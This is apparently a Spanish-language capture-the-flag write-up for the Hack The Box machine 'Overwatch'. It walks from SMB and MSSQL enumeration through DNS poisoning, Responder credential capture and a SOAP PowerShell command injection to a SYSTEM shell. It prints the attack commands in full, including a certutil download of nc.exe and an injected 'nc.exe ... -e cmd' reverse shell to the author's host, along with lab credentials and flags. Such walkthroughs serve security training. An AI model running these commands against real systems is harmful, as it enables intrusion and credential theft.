---
tags:
title: Overwatch - Medium (HTB)
permalink: /Overwatch-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
zs1n@kali ~> nmapf 10.129.244.81
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 12:58 -0500
Initiating Ping Scan at 12:58
Scanning 10.129.244.81 [4 ports]
Completed Ping Scan at 12:58, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:58
Completed Parallel DNS resolution of 1 host. at 12:58, 0.50s elapsed
Initiating SYN Stealth Scan at 12:58
Scanning 10.129.244.81 [65535 ports]
Discovered open port 135/tcp on 10.129.244.81
Discovered open port 445/tcp on 10.129.244.81
Discovered open port 139/tcp on 10.129.244.81
Discovered open port 3389/tcp on 10.129.244.81
Discovered open port 53/tcp on 10.129.244.81
Discovered open port 63561/tcp on 10.129.244.81
Discovered open port 63585/tcp on 10.129.244.81
Discovered open port 5985/tcp on 10.129.244.81
Discovered open port 63723/tcp on 10.129.244.81
Discovered open port 9389/tcp on 10.129.244.81
Discovered open port 49664/tcp on 10.129.244.81
Discovered open port 49667/tcp on 10.129.244.81
Discovered open port 88/tcp on 10.129.244.81
Discovered open port 63562/tcp on 10.129.244.81
Discovered open port 636/tcp on 10.129.244.81
Discovered open port 389/tcp on 10.129.244.81
Discovered open port 3268/tcp on 10.129.244.81
Discovered open port 593/tcp on 10.129.244.81
Discovered open port 63569/tcp on 10.129.244.81
Discovered open port 464/tcp on 10.129.244.81
Discovered open port 3269/tcp on 10.129.244.81
Completed SYN Stealth Scan at 12:58, 20.81s elapsed (65535 total ports)
Nmap scan report for 10.129.244.81
Host is up, received echo-reply ttl 127 (0.23s latency).
Scanned at 2026-03-05 12:58:27 EST for 21s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
63561/tcp open  unknown          syn-ack ttl 127
63562/tcp open  unknown          syn-ack ttl 127
63569/tcp open  unknown          syn-ack ttl 127
63585/tcp open  unknown          syn-ack ttl 127
63723/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.66 seconds
           Raw packets sent: 196578 (8.649MB) | Rcvd: 46 (3.021KB)
-e [*] IP: 10.129.244.81
[*] Puertos abiertos: 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49667,63561,63562,63569,63585,63723
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49667,63561,63562,63569,63585,63723 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 12:58 -0500
Nmap scan report for overwatch.htb (10.129.244.81)
Host is up (0.40s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     tcpwrapped
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-05 17:59:01Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-05T17:59:56+00:00
|_ssl-date: 2026-03-05T18:00:35+00:00; +1s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
63561/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
63562/tcp open     msrpc         Microsoft Windows RPC
63569/tcp open     msrpc         Microsoft Windows RPC
63585/tcp open     msrpc         Microsoft Windows RPC
63723/tcp filtered unknown
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2026-03-05T17:59:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.05 seconds
```

### SMB Enumeration

Como el inicio de sesión con el usuario `guest` esta habilitado me conecte, viendo así un recurso no común.

```bash
zs1n@kali ~> impacket-smbclient overwatch.htb/guest@S200401.overwatch.htb -dc-ip 10.129.244.81 -no-pass
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
software$
SYSVOL
```
### Download binary

Entre al mismo usando `use software$` y luego dentro de la única carpeta existente, vi un ejecutable de Windows, junto con sus respectivos archivos de configuración, así que me descargue todo.

```bash
# ls
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 .
drw-rw-rw-          0  Thu Jan  1 01:46:47 2026 ..
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 Monitoring
# cd Monitoring
ls
# ls
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 .
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 ..
-rw-rw-rw-    4991352  Tue Jan  6 06:25:34 2026 EntityFramework.dll
-rw-rw-rw-     591752  Tue Jan  6 06:25:34 2026 EntityFramework.SqlServer.dll
-rw-rw-rw-     163193  Tue Jan  6 06:25:34 2026 EntityFramework.SqlServer.xml
-rw-rw-rw-    3738289  Tue Jan  6 06:25:34 2026 EntityFramework.xml
-rw-rw-rw-      36864  Tue Jan  6 06:25:34 2026 Microsoft.Management.Infrastructure.dll
-rw-rw-rw-       9728  Tue Jan  6 06:25:34 2026 overwatch.exe
-rw-rw-rw-       2163  Tue Jan  6 06:25:34 2026 overwatch.exe.config
-rw-rw-rw-      30208  Tue Jan  6 06:25:34 2026 overwatch.pdb
-rw-rw-rw-     450232  Tue Jan  6 06:25:34 2026 System.Data.SQLite.dll
-rw-rw-rw-     206520  Tue Jan  6 06:25:34 2026 System.Data.SQLite.EF6.dll
-rw-rw-rw-     206520  Tue Jan  6 06:25:34 2026 System.Data.SQLite.Linq.dll
-rw-rw-rw-    1245480  Tue Jan  6 06:25:34 2026 System.Data.SQLite.xml
-rw-rw-rw-     360448  Tue Jan  6 06:25:34 2026 System.Management.Automation.dll
-rw-rw-rw-    7145771  Tue Jan  6 06:25:34 2026 System.Management.Automation.xml
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 x64
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 x86
# mget *
```
### Credential leakage

Viendo el contenido de algunas de las funciones se puede ver como en una de ellas, se declaran credenciales.

![[Pasted image 20260305150555.png]]
## Shell as sqlmgmt
### Validate

Usando las mismas en `nxc` para validarlas, vi que son validas.

```bash
zs1n@kali ~> nxc smb 10.129.244.81 -u sqlsvc -p 'TI0LKcfHzZw1Vv'
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```
### Mssql

Con el uso de las mismas me conecte a `mssqlclient`, pero no por el puerto por defecto, sino que en escaneo de `nmap` vi el puerto `6520` el cual correspondía al puerto donde corría la base de datos.

```bash
zs1n@kali ~> impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@S200401.overwatch.htb -dc-ip 10.129.244.81 -port 6520 -windows-auth
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```
### Link servers

Enumere servers linkeados, viendo que estaba además del servidor del dominio, estaba `SQL07`.

```bash
SQL (OVERWATCH\sqlsvc  guest@master)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```
### DNS Poisoning

Intentando ejecutar un comando en dicho servidor para saber si tenia ejecución de comandos ahí, vi que no podía, ya que parece que `S200401\SQLEXPRESS` intenta resolver a `SQL07` pero no recibe una respuesta.

```bash
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC('SELECT @@version') AT [SQL07];
INFO(S200401): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
```

Así que con `bloodyAD` y las credenciales que obtuve, cree una entrada `DNS` para que dicho hostname, resuelva a mi `ip`.

```bash
zs1n@kali ~> bloodyAD -d overwatch.htb -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --host S200401.overwatch.htb add dnsRecord SQL07 10.10.16.221
[+] SQL07 has been successfully added
```
### Hash theft

Luego use el componente del propio servicio `xp_dirtree` para poder intentar cargar un archivo el cual no existe desde mi `Envenenador (Responder)`.

```bash
SQL (-@master)> EXEC('xp_dirtree \\10.10.16.221\whoami') AT [SQL07];
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

Viendo que en mi otra consola, recibo las credenciales en texto plano del usuario `sqlmgmt`.

```bash
zs1n@kali ~> sudo responder -I tun0
..SNIP..

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```
### Shell 

Este par de credenciales era valido para conectarme al servicio de `WinRM`.

```powershell
zs1n@kali ~> evil-winrm -i overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> type ../desktop/user.txt
c67351aaba33eee070ef99372d3c5ef6
```
### Port Forwarding

Enumere puertos abiertos a nivel local, los cuales no estuvieran expuestos desde mi lado, en donde vi un servicio corriendo en el puerto `8000`.

```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> netstat -ano | findstr "LISTENING"
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       948
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       948
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       820
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6520           0.0.0.0:0              LISTENING       4364
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1996
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       568
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1284
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1644
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       2240
  TCP    0.0.0.0:56084          0.0.0.0:0              LISTENING       4364
  TCP    0.0.0.0:63561          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:63562          0.0.0.0:0              LISTENING       2820
  TCP    0.0.0.0:63565          0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:63569          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:63585          0.0.0.0:0              LISTENING       2292
  TCP    10.129.244.81:53       0.0.0.0:0              LISTENING       5696
  TCP    10.129.244.81:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       5696
  TCP    [::]:88                [::]:0                 LISTENING       700
  TCP    [::]:135               [::]:0                 LISTENING       948
  TCP    [::]:389               [::]:0                 LISTENING       700
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       700
  TCP    [::]:593               [::]:0                 LISTENING       948
  TCP    [::]:636               [::]:0                 LISTENING       700
  TCP    [::]:3268              [::]:0                 LISTENING       700
  TCP    [::]:3269              [::]:0                 LISTENING       700
  TCP    [::]:3389              [::]:0                 LISTENING       820
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:6520              [::]:0                 LISTENING       4364
  TCP    [::]:8000              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       1996
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       700
  TCP    [::]:49665             [::]:0                 LISTENING       568
  TCP    [::]:49666             [::]:0                 LISTENING       1284
  TCP    [::]:49667             [::]:0                 LISTENING       700
  TCP    [::]:49669             [::]:0                 LISTENING       1644
  TCP    [::]:49671             [::]:0                 LISTENING       2240
  TCP    [::]:56084             [::]:0                 LISTENING       4364
  TCP    [::]:63561             [::]:0                 LISTENING       700
  TCP    [::]:63562             [::]:0                 LISTENING       2820
  TCP    [::]:63565             [::]:0                 LISTENING       684
  TCP    [::]:63569             [::]:0                 LISTENING       700
  TCP    [::]:63585             [::]:0                 LISTENING       2292
  TCP    [::1]:53               [::]:0                 LISTENING       5696
  TCP    [dead:beef::19f]:53    [::]:0                 LISTENING       5696
  TCP    [dead:beef::e1af:a6d4:4c37:ed46]:53  [::]:0                 LISTENING       5696
  TCP    [fe80::e99e:c532:d250:9240%3]:53  [::]:0                 LISTENING       5696
```
### Chisel

Por lo que subí el binario de `chisel` a la maquina para traerme ese puerto a mi maquina.

```bahs
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> .\chisel.exe client -v 10.10.16.221:5555 R:socks
```

Y desde mi maquina previamente cree el servidor al cual se conecta la maquina en modo `cliente`.

```bash
zs1n@kali ~> chisel_socks 10.10.16.221 5555
[+] copied chisel client -v 10.10.16.221:5555 R:socks in clipboard
2026/03/05 13:39:44 server: Reverse tunnelling enabled
2026/03/05 13:39:44 server: Fingerprint 81Yxs7ZI+weJut4pTtSaSnQWjz1tpGO2y55wltf8TIA=
2026/03/05 13:39:44 server: Listening on http://0.0.0.0:5555
2026/03/05 13:39:55 server: session#1: Handshaking with 10.129.244.81:61807...
2026/03/05 13:40:00 server: session#1: Verifying configuration
2026/03/05 13:40:00 server: session#1: Client version (1.7.6) differs from server version (1.9.1)
2026/03/05 13:40:00 server: session#1: tun: Created
2026/03/05 13:40:00 server: session#1: tun: SSH connected
2026/03/05 13:40:00 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2026/03/05 13:40:00 server: session#1: tun: Bound proxies
```
### Website

La pagina muestra el servicio, el cual vi anteriormente en el código del ejecutable `overwatch.exe`.

![[Pasted image 20260305154635.png]]
### Command injection

En la función `KillProccess`, detecte un `Command injection`, donde se puede ver como en la linea `4` del código, concatena la entrada del usuario en un script de `PowerShell`.

```csharp
public string KillProcess(string processName)
{
    // LÍNEA VULNERABLE: Concatenación directa de entrada del usuario en un script de PowerShell
    string scriptContents = "Stop-Process -Name " + processName + " -Force";
    string result;
    
    try
    {
        using (Runspace runspace = RunspaceFactory.CreateRunspace())
        {
            runspace.Open();
            using (Pipeline pipeline = runspace.CreatePipeline())
            {
                // Se añade el script malicioso construido arriba
                pipeline.Commands.AddScript(scriptContents);
                pipeline.Commands.Add("Out-String");
                
                Collection<PSObject> collection = pipeline.Invoke();
                runspace.Close();
                
                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject psobject in collection)
                {
                    stringBuilder.AppendLine(psobject.ToString());
                }
                result = stringBuilder.ToString();
            }
        }
    }
    catch (Exception ex)
    {
        result = "Error: " + ex.Message;
    }
    
    return result;
}
```

El método `KillProcess(string processName)` recibe una cadena de texto directamente desde el servicio SOAP. El código **asume** que el usuario siempre enviará algo inocente como `notepad.exe` o `calc.exe`. No hay ninguna validación (filtros, listas blancas o limpieza de caracteres especiales), por lo que puedo inyectar mi linea de comandos a ejecutar luego de una `;` y luego de mi comando, volver a colocarlo para ignorar todo el resto.
### AddScript engine

```powershell
pipeline.Commands.AddScript(scriptContents);
pipeline.Commands.Add("Out-String");
Collection<PSObject> collection = pipeline.Invoke();
```

El método `.AddScript()` trata a `scriptContents` como un **script completo**, no como un solo comando con argumentos. Al encontrar el punto y coma (`;`), PowerShell interpreta que el primer comando terminó y que debe empezar uno nuevo.
Esto me permite a mi ejecutar comandos con los permisos o privilegios con los que se corra ese código.
### Shell

Ayudándome de la [siguiente guia](https://infosecwriteups.com/from-soap-to-shell-exploiting-legacy-soap-services-for-full-admin-account-takeover-and-nearly-5355009044c3), es como vi como poder con `curl`, enviar las cabeceras y el cuerpo necesario para mis propósitos

```bash
curl -X POST http://127.0.0.1:8000/MonitorService \
-H "Content-Type: text/xml; charset=utf-8" \
-H "SOAPAction: \"http://tempuri.org/IMonitoringService/KillProcess\"" \
-d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <KillProcess xmlns="http://tempuri.org/">
         <processName>notepad; C:\programdata\nc.exe 10.10.16.221 4444 -e cmd;</processName>
      </KillProcess>
   </soapenv:Body>
</soapenv:Envelope>'
```

Habiendo subido el binario del `nc.exe` con el siguiente comando:

```powershell
*Evil-WinRM* PS C:\programdata> certutil -urlcache -split -f http://10.10.16.221/nc.exe ./nc.exe
```

Y luego de ejecutar el comando de `curl`, se puede ver como me llega la shell como `system` de la maquina.

```powershell
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.221] from (UNKNOWN) [10.129.244.81] 62430
Microsoft Windows [Version 10.0.20348.4648]
(c) Microsoft Corporation. All rights reserved.

C:\Software\Monitoring>whoami
whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
72065f48b94d0ba73df2de6a2da20697
```

`~Happy Hacking.`


















```bash
zs1n@kali ~> rusthound-ce -d overwatch.htb -f S200401.pirate.htb -i 10.129.244.81 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -z -c All
---------------------------------------------------
Initializing RustHound-CE at 13:11:23 on 03/05/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-05T18:11:23Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-05T18:11:23Z INFO  rusthound_ce] Collection method: All
[2026-03-05T18:11:23Z INFO  rusthound_ce::ldap] Connected to OVERWATCH.HTB Active Directory!
[2026-03-05T18:11:23Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-05T18:11:24Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-05T18:11:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=overwatch,DC=htb
[2026-03-05T18:11:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-05T18:11:44Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=overwatch,DC=htb
[2026-03-05T18:11:44Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-05T18:12:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=overwatch,DC=htb
[2026-03-05T18:12:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-05T18:12:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=overwatch,DC=htb
[2026-03-05T18:12:02Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-05T18:12:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=overwatch,DC=htb
[2026-03-05T18:12:03Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-03-05T18:12:03Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-03-05T18:12:03Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 106 users parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-03-05T18:12:03Z INFO  rusthound_ce::json::maker::common] .//20260305131203_overwatch-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 13:12:03 on 03/05/26! Happy Graphing!
```

```bash
zs1n@kali ~> rpcclient -U 'sqlsvc%TI0LKcfHzZw1Vv' overwatch.htb
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sqlsvc] rid:[0x450]
user:[sqlmgmt] rid:[0x451]
user:[Charlie.Moss] rid:[0x458]
user:[Tracy.Burns] rid:[0x459]
user:[Kathryn.Bryan] rid:[0x45a]
user:[Rachael.Thomas] rid:[0x45b]
user:[Aimee.Smith] rid:[0x45c]
user:[Duncan.Freeman] rid:[0x45d]
user:[John.Begum] rid:[0x45e]
user:[Bernard.Hilton] rid:[0x45f]
user:[Kim.Hargreaves] rid:[0x460]
user:[Douglas.Burrows] rid:[0x461]
user:[Carole.Murray] rid:[0x462]
user:[Olivia.Quinn] rid:[0x463]
user:[Trevor.Baker] rid:[0x464]
user:[Kenneth.Dennis] rid:[0x465]
user:[Jeremy.Marshall] rid:[0x466]
user:[Jodie.Jones] rid:[0x467]
user:[Thomas.Lee] rid:[0x468]
user:[Terence.Matthews] rid:[0x469]
user:[Colin.Roberts] rid:[0x46a]
user:[Aaron.Robinson] rid:[0x46b]
user:[Amanda.Jenkins] rid:[0x46c]
user:[Debra.Arnold] rid:[0x46d]
user:[Michelle.Willis] rid:[0x46e]
user:[Kayleigh.Jones] rid:[0x46f]
user:[Adam.Russell] rid:[0x470]
user:[Tracey.Kelly] rid:[0x471]
user:[Bethan.Dale] rid:[0x472]
user:[Mandy.Wood] rid:[0x473]
user:[Jenna.Phillips] rid:[0x474]
user:[Carole.Yates] rid:[0x475]
user:[Graham.Perry] rid:[0x476]
user:[Catherine.Griffiths] rid:[0x477]
user:[Shaun.Jackson] rid:[0x478]
user:[Bethan.Rogers] rid:[0x479]
user:[Ellie.Singh] rid:[0x47a]
user:[Marie.Allan] rid:[0x47b]
user:[Patrick.Holmes] rid:[0x47c]
user:[Victor.Hopkins] rid:[0x47d]
user:[Geraldine.Harper] rid:[0x47e]
user:[George.Todd] rid:[0x47f]
user:[Karl.Smith] rid:[0x480]
user:[Jacqueline.Norton] rid:[0x481]
user:[Frederick.Murray] rid:[0x482]
user:[Joe.Pearce] rid:[0x483]
user:[Paul.Collins] rid:[0x484]
user:[Damien.Edwards] rid:[0x485]
user:[Eileen.Phillips] rid:[0x486]
user:[Carl.Johnson] rid:[0x487]
user:[Kevin.Newton] rid:[0x488]
user:[Natalie.Higgins] rid:[0x489]
user:[Francis.Weston] rid:[0x48a]
user:[Benjamin.Davison] rid:[0x48b]
user:[Martin.Kemp] rid:[0x48c]
user:[Angela.Jones] rid:[0x48d]
user:[Gareth.Ahmed] rid:[0x48e]
user:[Deborah.Morgan] rid:[0x48f]
user:[Grace.Taylor] rid:[0x490]
user:[Roger.Hughes] rid:[0x491]
user:[Albert.Barrett] rid:[0x492]
user:[Grace.Curtis] rid:[0x493]
user:[Marilyn.Griffiths] rid:[0x494]
user:[Tracey.Barker] rid:[0x495]
user:[Suzanne.Hughes] rid:[0x496]
user:[Timothy.Jackson] rid:[0x497]
user:[Beverley.Thompson] rid:[0x498]
user:[Clare.Bartlett] rid:[0x499]
user:[Irene.Johnson] rid:[0x49a]
user:[Bernard.Wood] rid:[0x49b]
user:[Frank.McCarthy] rid:[0x49c]
user:[Elaine.Page] rid:[0x49d]
user:[Elaine.Walker] rid:[0x49e]
user:[Mohammad.Hill] rid:[0x49f]
user:[Glenn.Field] rid:[0x4a0]
user:[Deborah.Martin] rid:[0x4a1]
user:[Gail.Sullivan] rid:[0x4a2]
user:[Maureen.Kirby] rid:[0x4a3]
user:[Georgina.Chambers] rid:[0x4a4]
user:[Philip.Harris] rid:[0x4a5]
user:[Samantha.Scott] rid:[0x4a6]
user:[Ann.Hill] rid:[0x4a7]
user:[Chloe.Cox] rid:[0x4a8]
user:[Jamie.Gough] rid:[0x4a9]
user:[Frederick.Hussain] rid:[0x4aa]
user:[Dean.Hobbs] rid:[0x4ab]
user:[Danielle.Moore] rid:[0x4ac]
user:[Timothy.Smith] rid:[0x4ad]
user:[Declan.Stone] rid:[0x4ae]
user:[Jacob.Wilson] rid:[0x4af]
user:[Gary.Elliott] rid:[0x4b0]
user:[Peter.Slater] rid:[0x4b1]
user:[Louise.Walton] rid:[0x4b2]
user:[Brett.Haynes] rid:[0x4b3]
user:[Elliot.Green] rid:[0x4b4]
user:[Wendy.Williams] rid:[0x4b5]
user:[Graham.Parker] rid:[0x4b6]
user:[Abdul.Stevens] rid:[0x4b7]
user:[Brett.Bailey] rid:[0x4b8]
user:[Benjamin.Harrison] rid:[0x4b9]
user:[Emily.Cooper] rid:[0x4ba]
user:[Roger.Spencer] rid:[0x4bb]
```